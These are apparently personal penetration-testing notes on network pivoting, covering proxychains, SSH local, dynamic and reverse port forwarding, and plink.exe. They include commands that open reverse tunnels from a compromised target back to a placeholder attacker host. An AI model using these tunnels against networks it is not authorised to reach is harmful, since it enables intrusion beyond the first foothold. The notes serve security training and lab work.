# Pivoting

## There are 2 types of pivoting

1. Port Forwarding (only one port)
2. Tunnelling and Proxying (all ports)

## Proxychains

Works by prepending the command `proxychains` before other commands.

Proxychains configuration file: `/etc/proxychains.conf` (but proxychains will look into working direcotry first)

```bash
cp /etc/proxychains.conf .
```

## SSH Tunnelling / Port Forwarding

### Forward (local) Connections

Created from our attacking machine, when we have SSH access to the target.

Local port forwarding:
```bash
ssh -L LOCAL_LPORT:TARGET_RHOST:TARGET_RPORT USER@TARGET_RHOST -fN
```

Dynamic proxy:
```bash
ssh -D LOCAL_LPORT USER@TARGET_RHOST -fN
```

## Reverse Connections

When we have shell, but not a SSH access.

First we need to generate ssh key:
```bash
ssh-keygen
```

Add this line into `authorized_keys`, then your generated key:
```bash
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty YOUR_KEY
```

Check is the SSH server is running on your machine:
```bash
sudo systemctl status ssh
sudo systemctl start ssh
```

Then connect back with reverse port forward:
```
ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
```

Or create reverse proxy:
```bash
ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN
```

Closing SSH connections:
```bash
ps aux | grep ssh
sudo kill PID
```

## plink.exe

[https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)

```
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```

Note that any keys generated by `ssh-keygen` will not work properly here. You will need to convert them using the `puttygen` tool, which can be installed on Kali using `sudo apt install putty-tools`. After downloading the tool, conversion can be done with: `puttygen KEYFILE -o OUTPUT_KEY.ppk`
Substituting in a valid file for the keyfile, and adding in the output file.
